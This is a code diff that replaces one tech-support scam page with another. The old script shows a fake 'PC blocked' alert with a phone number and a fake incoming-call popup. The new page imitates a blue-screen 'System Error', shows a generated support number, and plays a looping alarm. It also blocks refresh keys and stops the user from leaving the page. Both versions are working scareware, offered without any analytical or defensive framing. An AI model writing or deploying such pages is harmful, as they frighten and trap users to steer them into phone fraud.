@@ -1,57 +1,83 @@
-<script>
-    var message = "Access to this PC has been blocked for security reasons.\n\nError: Ox800VDS\n\nPlease contact our technical support team immediately.\n\n+1 866-520-3370";
-    alert(message);
-
-    function blockPage() {
-        if (document.readyState === 'complete') {
-            document.body.style.overflow = 'hidden';
-            document.body.style.position = 'fixed';
-            document.body.style.width = '100%';
-            document.body.style.height = '100%';
-            document.body.style.margin = '0';
-            document.body.style.padding = '0';
-            document.body.style.backgroundColor = 'white';
-        } else {
-            window.onload = blockPage;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Error</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
         }
-    }
+        .error-box {
+            text-align: center;
+            background: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            border: 2px solid #ff0000;
+        }
+        .error-box img {
+            max-width: 100%;
+            height: auto;
+        }
+        .error-box p {
+            font-size: 1.2em;
+            margin: 20px 0;
+        }
+        .error-box button {
+            padding: 10px 20px;
+            font-size: 1em;
+            cursor: pointer;
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="error-box">
+        <img src="YOUR_IMAGE_URL" alt="BSOD">
+        <p>Your system has encountered a critical error. Please call our support team at <strong id="phone-number"></strong> for immediate assistance.</p>
+        <button onclick="callSupport()">Call Support</button>
+    </div>
+    <audio id="alarm" src="YOUR_ALARM_AUDIO_URL" loop></audio>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            const phoneNumber = generateRandomPhoneNumber();
+            document.getElementById('phone-number').textContent = phoneNumber;
+            document.getElementById('alarm').play();
+            hijackBrowser();
+        });
 
-    blockPage();
+        function generateRandomPhoneNumber() {
+            const areaCode = Math.floor(100 + Math.random() * 900);
+            const centralOfficeCode = Math.floor(100 + Math.random() * 900);
+            const lineNumber = Math.floor(1000 + Math.random() * 9000);
+            return `1-${areaCode}-${centralOfficeCode}-${lineNumber}`;
+        }
 
-    function showPopUp() {
-        var popUp = document.createElement('div');
-        popUp.style.position = 'fixed';
-        popUp.style.top = '50%';
-        popUp.style.left = '50%';
-        popUp.style.transform = 'translate(-50%, -50%)';
-        popUp.style.backgroundColor = 'white';
-        popUp.style.border = '2px solid black';
-        popUp.style.padding = '20px';
-        popUp.style.zIndex = '10000';
-        popUp.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
-        popUp.innerHTML = `
-            <h2>Incoming Call</h2>
-            <p>Please answer the call to resolve the issue.</p>
-            <button onclick="answerCall()">Answer Call</button>
-            <button onclick="declineCall()">Decline Call</button>
-        `;
-        document.body.appendChild(popUp);
-    }
+        function callSupport() {
+            window.location.href = `tel:${document.getElementById('phone-number').textContent.replace(/[^\d]/g, '')}`;
+        }
 
-    function answerCall() {
-        alert('Calling +1 866-520-3370...');
-        window.location.href = 'tel:+18665203370';
-    }
-
-    function declineCall() {
-        alert('Call declined. Please contact support at your earliest convenience.');
-        document.body.removeChild(document.querySelector('div'));
-    }
-
-    showPopUp();
-
-    setTimeout(function() {
-        var audio = new Audio('https://example.com/call-sound.mp3');
-        audio.play();
-    }, 5000);
-</script>
+        function hijackBrowser() {
+            window.onbeforeunload = function() {
+                return 'Are you sure you want to leave? Your system error needs immediate attention.';
+            };
+            window.addEventListener('keydown', function(e) {
+                if (e.key === 'F5' || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'R')) {
+                    e.preventDefault();
+                }
+            });
+        }
+    </script>
+</body>
+</html>
